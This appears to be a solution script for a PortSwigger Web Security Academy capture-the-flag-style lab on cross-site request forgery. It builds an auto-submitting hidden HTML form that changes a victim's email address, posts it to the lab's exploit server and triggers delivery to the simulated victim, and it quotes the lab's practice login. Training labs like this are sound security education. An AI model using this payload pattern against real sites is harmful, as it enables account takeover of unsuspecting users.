'''
This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/csrf/lab-no-defenses
'''

import requests

lab_id = '0a13001c04d4fc3c81b2124300db00e2' # change based on generated lab
exploit_serv_id = 'exploit-0a4600e4044afcf38129114501a20086' # change based on generated exploit server


html_form = f'''<form method="POST" action="https://{lab_id}.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hacked@web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
'''

def main():
    # Send exploit to generated hosting server. Use the html payload above
    uri = f"https://{exploit_serv_id}.exploit-server.net"
    data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": html_form, "formAction": "STORE"}
    r1 = requests.post(uri, data=data)
    

    # Trigger the victim to access the exploit server and activate the payload
    uri = f"https://{exploit_serv_id}.exploit-server.net/deliver-to-victim"
    r2 = requests.get(uri)
    print('done')

if __name__ == '__main__':
    main()